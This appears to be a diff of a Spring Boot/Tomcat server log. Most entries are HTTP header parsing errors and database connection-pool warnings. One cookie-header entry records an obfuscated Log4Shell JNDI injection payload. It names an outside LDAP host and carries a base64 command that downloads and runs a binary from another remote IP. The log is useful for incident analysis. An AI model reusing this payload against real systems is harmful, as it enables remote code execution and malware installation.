+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) [na:1.8.0_311]
+	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) [tomcat-embed-core-9.0.45.jar!/:na]
+	at java.lang.Thread.run(Thread.java:748) [na:1.8.0_311]
+
+2022-02-09 23:21:35.587  INFO 8250 --- [io-8081-exec-10] o.apache.coyote.http11.Http11Processor   : Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+
+java.lang.IllegalArgumentException: Invalid character found in method name [0x160x030x010x000xee0x010x000x000xea0x030x030xec0xa68v0xe900x960xf80xdd0x000x09M0x10<0xb6rA0xef0xfd0xb3g0xf7S0xb7B40xa60x9c+I0x040xdd]. HTTP method names must be tokens
+	at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:417) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:261) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:893) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1707) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) [tomcat-embed-core-9.0.45.jar!/:na]
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) [na:1.8.0_311]
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) [na:1.8.0_311]
+	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) [tomcat-embed-core-9.0.45.jar!/:na]
+	at java.lang.Thread.run(Thread.java:748) [na:1.8.0_311]
+
+2022-02-10 05:13:16.244  INFO 8250 --- [nio-8081-exec-2] o.apache.coyote.http11.Http11Processor   : Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+
+java.lang.IllegalArgumentException: Invalid character found in method name [0x160x030x010x000x8d0x010x000x000x890x030x030xf40xd00xec0xf30x86\E0x9a0xbeE0xde10x800xb0n0x890xd40x940xc0Y]0xa7t0xd90xea{0x1b0x8d$0xcb0xa70x950x000x000x1a0xc0/0xc0+0xc00x110xc00x070xc00x130xc00x090xc00x140xc00x0a0x000x050x00/0x0050xc00x120x000x0a0x010x000x00F0x000x000x000x140x000x120x000x000x0f114.115.131.1200x000x050x000x050x010x000x000x000x000x000x0a0x000x080x000x060x000x170x000x180x000x190x000x0b0x000x020x010x000x000x0d0x000x0a0x000x080x040x010x040x030x020x010x020x030xff0x010x000x01...]. HTTP method names must be tokens
+	at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:417) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:261) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:893) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1707) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) [tomcat-embed-core-9.0.45.jar!/:na]
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) [na:1.8.0_311]
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) [na:1.8.0_311]
+	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) [tomcat-embed-core-9.0.45.jar!/:na]
+	at java.lang.Thread.run(Thread.java:748) [na:1.8.0_311]
+
+2022-02-11 01:36:48.720  INFO 8250 --- [nio-8081-exec-9] o.apache.coyote.http11.Http11Processor   : Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+
+java.lang.IllegalArgumentException: Invalid character found in method name [0x040x010x00PpTi4...]. HTTP method names must be tokens
+	at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:417) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:261) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:893) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1707) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) [tomcat-embed-core-9.0.45.jar!/:na]
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) [na:1.8.0_311]
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) [na:1.8.0_311]
+	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) [tomcat-embed-core-9.0.45.jar!/:na]
+	at java.lang.Thread.run(Thread.java:748) [na:1.8.0_311]
+
+2022-02-11 05:14:46.146  INFO 8250 --- [nio-8081-exec-6] o.apache.coyote.http11.Http11Processor   : Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+
+java.lang.IllegalArgumentException: Invalid character found in method name [0x160x030x010x000x8d0x010x000x000x890x030x030xb90x9e0xe50x0c0xdeX0xe10xc10xa10x9b0xf10xc10xb7:;0xfdZ0xe9x0x980x9co5`0x06:0x820x190xf20x910x8f{0x000x000x1a0xc0/0xc0+0xc00x110xc00x070xc00x130xc00x090xc00x140xc00x0a0x000x050x00/0x0050xc00x120x000x0a0x010x000x00F0x000x000x000x140x000x120x000x000x0f114.115.131.1200x000x050x000x050x010x000x000x000x000x000x0a0x000x080x000x060x000x170x000x180x000x190x000x0b0x000x020x010x000x000x0d0x000x0a0x000x080x040x010x040x030x020x010x020x030xff0x010x000x01...]. HTTP method names must be tokens
+	at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:417) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:261) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:893) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1707) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) [tomcat-embed-core-9.0.45.jar!/:na]
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) [na:1.8.0_311]
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) [na:1.8.0_311]
+	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) [tomcat-embed-core-9.0.45.jar!/:na]
+	at java.lang.Thread.run(Thread.java:748) [na:1.8.0_311]
+
+2022-02-11 11:35:32.862  WARN 8250 --- [nio-8081-exec-2] com.zaxxer.hikari.pool.PoolBase          : HikariPool-1 - Failed to validate connection com.mysql.cj.jdbc.ConnectionImpl@1a82e546 (No operations allowed after connection closed.). Possibly consider using a shorter maxLifetime value.
+2022-02-11 11:35:32.871  WARN 8250 --- [nio-8081-exec-2] com.zaxxer.hikari.pool.PoolBase          : HikariPool-1 - Failed to validate connection com.mysql.cj.jdbc.ConnectionImpl@61ad2a2 (No operations allowed after connection closed.). Possibly consider using a shorter maxLifetime value.
+2022-02-11 20:27:08.486  WARN 8250 --- [nio-8081-exec-2] com.zaxxer.hikari.pool.PoolBase          : HikariPool-1 - Failed to validate connection com.mysql.cj.jdbc.ConnectionImpl@4b5422cb (No operations allowed after connection closed.). Possibly consider using a shorter maxLifetime value.
+2022-02-11 20:27:08.495  WARN 8250 --- [nio-8081-exec-2] com.zaxxer.hikari.pool.PoolBase          : HikariPool-1 - Failed to validate connection com.mysql.cj.jdbc.ConnectionImpl@1bdbea77 (No operations allowed after connection closed.). Possibly consider using a shorter maxLifetime value.
+2022-02-12 05:15:28.364  INFO 8250 --- [nio-8081-exec-3] o.apache.coyote.http11.Http11Processor   : Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+
+java.lang.IllegalArgumentException: Invalid character found in method name [0x160x030x010x000x8d0x010x000x000x890x030x03^e&0xaa0xeb0xd80xf5P&z0V0xc20xafn0x1bO/0x1f0xdba0x1c>0xbfv0xcb0xcd0xcd0x9f(0x9d0xf40x000x000x1a0xc0/0xc0+0xc00x110xc00x070xc00x130xc00x090xc00x140xc00x0a0x000x050x00/0x0050xc00x120x000x0a0x010x000x00F0x000x000x000x140x000x120x000x000x0f114.115.131.1200x000x050x000x050x010x000x000x000x000x000x0a0x000x080x000x060x000x170x000x180x000x190x000x0b0x000x020x010x000x000x0d0x000x0a0x000x080x040x010x040x030x020x010x020x030xff0x010x000x01...]. HTTP method names must be tokens
+	at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:417) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:261) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:893) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1707) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) [tomcat-embed-core-9.0.45.jar!/:na]
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) [na:1.8.0_311]
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) [na:1.8.0_311]
+	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) [tomcat-embed-core-9.0.45.jar!/:na]
+	at java.lang.Thread.run(Thread.java:748) [na:1.8.0_311]
+
+2022-02-12 22:50:18.461  WARN 8250 --- [nio-8081-exec-9] com.zaxxer.hikari.pool.PoolBase          : HikariPool-1 - Failed to validate connection com.mysql.cj.jdbc.ConnectionImpl@d11c701 (No operations allowed after connection closed.). Possibly consider using a shorter maxLifetime value.
+2022-02-12 23:30:19.534  WARN 8250 --- [nio-8081-exec-8] com.zaxxer.hikari.pool.PoolBase          : HikariPool-1 - Failed to validate connection com.mysql.cj.jdbc.ConnectionImpl@3a6091b6 (No operations allowed after connection closed.). Possibly consider using a shorter maxLifetime value.
+2022-02-12 23:30:19.543  WARN 8250 --- [nio-8081-exec-8] com.zaxxer.hikari.pool.PoolBase          : HikariPool-1 - Failed to validate connection com.mysql.cj.jdbc.ConnectionImpl@220d2392 (No operations allowed after connection closed.). Possibly consider using a shorter maxLifetime value.
+2022-02-12 23:30:19.551  WARN 8250 --- [nio-8081-exec-8] com.zaxxer.hikari.pool.PoolBase          : HikariPool-1 - Failed to validate connection com.mysql.cj.jdbc.ConnectionImpl@1caae929 (No operations allowed after connection closed.). Possibly consider using a shorter maxLifetime value.
+2022-02-12 23:30:19.558  WARN 8250 --- [nio-8081-exec-8] com.zaxxer.hikari.pool.PoolBase          : HikariPool-1 - Failed to validate connection com.mysql.cj.jdbc.ConnectionImpl@2279262b (No operations allowed after connection closed.). Possibly consider using a shorter maxLifetime value.
+2022-02-13 05:16:41.488  INFO 8250 --- [nio-8081-exec-8] o.apache.coyote.http11.Http11Processor   : Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+
+java.lang.IllegalArgumentException: Invalid character found in method name [0x160x030x010x000x8d0x010x000x000x890x030x030x8e0x0eiO0x0c60x07F0x7f&0xb00xa7yeHu0xa5L0xd60x9f0xe70xfa%H0x03]. HTTP method names must be tokens
+	at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:417) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:261) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:893) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1707) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) [tomcat-embed-core-9.0.45.jar!/:na]
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) [na:1.8.0_311]
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) [na:1.8.0_311]
+	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) [tomcat-embed-core-9.0.45.jar!/:na]
+	at java.lang.Thread.run(Thread.java:748) [na:1.8.0_311]
+
+2022-02-14 15:37:52.698  INFO 8250 --- [nio-8081-exec-9] o.apache.coyote.http11.Http11Processor   : Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+
+java.lang.IllegalArgumentException: Invalid character found in method name [0x160x030x010x000x8d0x010x000x000x890x030x03A0xaa0xdb0xb70x80=o(0xf40xd60x8e0x880x170xc60x92a0x89sMw0x120x910x190x8c0xf80xe80xad/0x92d0xb8.0x000x000x1a0xc0/0xc0+0xc00x110xc00x070xc00x130xc00x090xc00x140xc00x0a0x000x050x00/0x0050xc00x120x000x0a0x010x000x00F0x000x000x000x140x000x120x000x000x0f114.115.131.1200x000x050x000x050x010x000x000x000x000x000x0a0x000x080x000x060x000x170x000x180x000x190x000x0b0x000x020x010x000x000x0d0x000x0a0x000x080x040x010x040x030x020x010x020x030xff0x010x000x01...]. HTTP method names must be tokens
+	at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:417) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:261) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:893) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1707) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) [tomcat-embed-core-9.0.45.jar!/:na]
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) [na:1.8.0_311]
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) [na:1.8.0_311]
+	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) [tomcat-embed-core-9.0.45.jar!/:na]
+	at java.lang.Thread.run(Thread.java:748) [na:1.8.0_311]
+
+2022-02-14 19:31:48.378  INFO 8250 --- [nio-8081-exec-6] o.apache.tomcat.util.http.parser.Cookie  : A cookie header was received [('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//150.136.111.68:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTU4LjEwMS4xMTguMjM2L2Rldl9zc2hkOyBjdXJsIC1PIGh0dHA6Ly8xNTguMTAxLjExOC4yMzYvZGV2X3NzaGQ7IGNobW9kIDc3NyBkZXZfc3NoZDsgLi9kZXZfc3NoZCBleHBsb2l0Lng4Ng==}')] that contained an invalid cookie. That cookie will be ignored.
+ Note: further occurrences of this error will be logged at DEBUG level.
+2022-02-15 00:10:08.405  WARN 8250 --- [nio-8081-exec-3] com.zaxxer.hikari.pool.PoolBase          : HikariPool-1 - Failed to validate connection com.mysql.cj.jdbc.ConnectionImpl@7b0cf402 (No operations allowed after connection closed.). Possibly consider using a shorter maxLifetime value.
